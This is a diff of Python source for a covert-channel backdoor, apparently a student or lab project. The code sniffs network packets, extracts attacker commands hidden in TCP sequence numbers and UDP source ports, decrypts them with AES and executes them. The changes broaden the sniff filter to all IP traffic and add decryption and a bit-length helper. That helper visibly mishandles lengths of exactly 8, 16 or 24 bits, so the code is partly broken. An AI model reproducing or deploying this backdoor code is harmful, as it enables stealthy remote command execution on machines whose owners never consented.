@@ -17,7 +17,7 @@ dstPort = parseConfig.dstPort
 key = parseConfig.key
 IV = parseConfig.IV
 authentication = parseConfig.authentication
-clientIP = parseConfig.clientIP
+global clientIP
 monitorDir = parseConfig.monitorDir
 messages = []
 
@@ -25,7 +25,7 @@ messages = []
 #1. Listen for commands from the attacker
 def sniffing():
     #TODO:Need to take out host
-    sniff(filter="ip and host 192.168.0.6", prn=handle)
+    sniff(filter="ip", prn=handle)
 
 def handle(packet):
     #TODO: FIX THIS
@@ -43,21 +43,23 @@ def handle(packet):
             # print "Position is " + position
             total = payload[2].split(":")[1]
             # print "Total is " + total
-
             if(packet.haslayer(TCP)):
                 #Define the length
                 length = 32
                 # decrypt the covert contents
                 # print "Covert content = " + str(packet[TCP].seq)
                 # convert to binary
-                covertContent = bin(packet[TCP].seq)[2:].zfill(length)
+                field = packet[TCP].seq
+                #Converts the bits to the nearest divisible by 8
+                covertContent = lengthChecker("TCP",field)
                 # print "binary is " + covertContent
             elif(packet.haslayer(UDP)):
                 length = 16
                 # decrypt the covert contents
                 # print "Covert content = " + str(packet[UDP].sport)
                 # convert to binary
-                covertContent = bin(packet[UDP].sport)[2:].zfill(length)
+                field = packet[UDP].sport
+                covertContent = lengthChecker("UDP",field)
                 # print "binary is " + covertContent
             # If there is only 1 message for this command, reconstruct it
             #if(total == 1):
@@ -70,7 +72,12 @@ def handle(packet):
                 if(checkCommands(UID)):
                     #DEBUG: print "Max reached, reconstruct command"
                     command = reconstructCommand(UID)
+                    print "Command reconstructed is " + command
+                    command = decrypt(command)
+                    print str(len(command))
+                    #decryptedCommand = decrypt(command)
                     print "COMMAND: " + command
+                    # print "DECRYPT " + decryptedCommand
                     #Delete that command from the list
                     deleteCommand(UID)
                     result = runCommand(command)
@@ -80,6 +87,26 @@ def handle(packet):
                     #Run the command
                 # else:
                     #DEBUG: print "Max not reached, don't reconstruct command yet"
+
+def lengthChecker(type,field):
+    covertContent = 0
+    seqContent = bin(field)[2:]
+    if (type == "TCP"):
+        if len(seqContent) < 8:
+            covertContent = bin(field)[2:].zfill(8)
+        elif len(seqContent) > 8 and len(seqContent) < 16:
+            covertContent = bin(field)[2:].zfill(16)
+        elif len(seqContent) > 16 and len(seqContent) < 24:
+            covertContent = bin(field)[2:].zfill(24)
+        elif len(seqContent) > 24 and len(seqContent) < 32:
+            covertContent = bin(field)[2:].zfill(32)
+    elif(type == "UDP"):
+        if len(seqContent) < 8:
+            covertContent = bin(field)[2:].zfill(8)
+        elif len(seqContent) > 8 and len(seqContent) < 16:
+            covertContent = bin(field)[2:].zfill(16)
+    return covertContent
+
 def authenticate(packet):
     global command
     global authentication
@@ -168,7 +195,8 @@ def reconstructCommand(UID):
                  chunks[x] = int(chunks[x], 2)
                  chunks[x] = chr(chunks[x])
             # print chunks
-            return ''.join(chunks)
+            message = ''.join(chunks)
+            return message
         pass
 
 def deleteCommand(UID):
@@ -311,20 +339,14 @@ def runCommand(command):
     #print "Output is " + result
     return result
 
-
-
 ##HELPERS
 def decrypt(command):
-    global key
-    global IV
+    print "Decrypt Cipher Text " + command
     decryptor = AES.new(key, AES.MODE_CFB, IV=IV)
     plain = decryptor.decrypt(command)
     return plain
 
-
 def encrypt(command):
-    global key
-    global IV
     encryptor = AES.new(key, AES.MODE_CFB, IV=IV)
     plain = encryptor.encrypt(command)
     return plain
